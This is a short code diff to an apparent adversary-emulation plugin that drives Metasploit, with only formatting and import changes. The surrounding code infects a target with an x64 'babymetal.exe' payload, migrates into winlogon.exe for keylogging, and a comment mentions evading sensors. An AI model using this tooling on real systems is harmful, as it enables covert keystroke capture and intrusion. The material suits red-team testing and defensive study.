@@ -3,7 +3,6 @@
 # A plugin to nmap targets slow motion, to evade sensors
 
 from plugins.base.attack import AttackPlugin, Requirement
-from app.metasploit import MetasploitInstant
 
 
 class MetasploitKeyloggingPlugin(AttackPlugin):
@@ -33,12 +32,11 @@ class MetasploitKeyloggingPlugin(AttackPlugin):
         payload_name = "babymetal.exe"
         target = self.targets[0]
 
-
         self.metasploit.smart_infect(target,
-                                payload=payload_type,
-                                outfile=payload_name,
-                                format="exe",
-                                architecture="x64")
+                                     payload=payload_type,
+                                     outfile=payload_name,
+                                     format="exe",
+                                     architecture="x64")
 
         self.metasploit.migrate(target, name="winlogon.exe")
 
